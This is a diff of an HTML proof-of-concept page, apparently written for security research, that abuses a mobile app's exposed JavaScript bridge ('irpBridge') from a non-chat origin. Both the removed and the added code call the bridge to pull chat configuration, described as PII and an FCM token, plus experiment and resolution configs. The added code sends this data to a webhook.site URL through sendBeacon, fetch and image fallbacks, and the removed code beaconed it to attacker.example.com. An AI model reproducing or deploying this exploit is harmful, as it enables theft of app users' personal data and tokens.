@@ -1,19 +1,60 @@
 <!doctype html>
+<html>
+<head><meta charset="utf-8"><title>chat-bridge PoC</title></head>
+<body style="font-family:monospace;white-space:pre-wrap;padding:12px">
+<h3>chat-bridge PoC</h3>
+<div id="out">booting…</div>
 <script>
-  window.onChatConfigReady = function (c) {
-    document.body.innerText = "LEAKED:\n" + JSON.stringify(c, null, 2);
-    navigator.sendBeacon("https://attacker.example.com/collect",
-                         JSON.stringify(c));
+  const SINK = "https://webhook.site/b64a8be8-42a1-4950-bd69-6009752ba11d";
+  const out = document.getElementById("out");
+  const log = (m) => { out.innerText += "\n" + m; };
+
+  function exfil(label, data) {
+    const payload = JSON.stringify({ label, ua: navigator.userAgent, href: location.href, data });
+    // 1) sendBeacon (fire-and-forget, survives navigation)
+    try { navigator.sendBeacon(SINK, payload); } catch (_) {}
+    // 2) fetch fallback (no-cors so webhook.site accepts it)
+    try {
+      fetch(SINK, { method: "POST", mode: "no-cors", headers: { "Content-Type": "text/plain" }, body: payload });
+    } catch (_) {}
+    // 3) GET-image fallback (last resort)
+    try {
+      const img = new Image();
+      img.src = SINK + "?label=" + encodeURIComponent(label) + "&d=" + encodeURIComponent(payload).slice(0, 1800);
+    } catch (_) {}
+  }
+
+  // Async callback that the native bridge will invoke via evaluateJavascript
+  window.onChatConfigReady = function (cfg) {
+    log("onChatConfigReady fired");
+    log("config = " + JSON.stringify(cfg, null, 2));
+    exfil("getChatConfig", cfg);
   };
-  try {
-    document.body.innerText = "irpBridge present: " + (typeof irpBridge);
-    // Pull PII + FCM token
-    irpBridge.getChatConfig();
-    // And dump the full IrpExperiment
-    document.body.innerText += "\n\nconfig:\n" + irpBridge.sendConfigResponse();
-    // Optional: prove onCtaClick is reachable from a non-chat origin
-    // irpBridge.onCtaClick("MY_BANK_DETAILS", "{}");
-  } catch (e) {
-    document.body.innerText = "no bridge: " + e;
+
+  out.innerText = "irpBridge present: " + (typeof window.irpBridge);
+  exfil("page-loaded", { irpBridge: typeof window.irpBridge });
+
+  if (typeof window.irpBridge === "object" && window.irpBridge !== null) {
+    log("calling sendConfigResponse() …");
+    try {
+      const raw = window.irpBridge.sendConfigResponse();
+      log("sendConfigResponse() = " + raw);
+      let parsed = null; try { parsed = JSON.parse(raw); } catch (_) {}
+      exfil("sendConfigResponse", parsed || raw);
+    } catch (e) { log("sendConfigResponse error: " + e); }
+
+    log("calling getChatConfig() …");
+    try { window.irpBridge.getChatConfig(); } catch (e) { log("getChatConfig error: " + e); }
+
+    // Optional: probe getFetchResolutionConfig (sync, also sensitive)
+    try {
+      const frc = window.irpBridge.getFetchResolutionConfig();
+      log("getFetchResolutionConfig() = " + frc);
+      exfil("getFetchResolutionConfig", frc);
+    } catch (_) {}
+  } else {
+    log("bridge NOT attached — substring match likely failed");
   }
 </script>
+</body>
+</html>
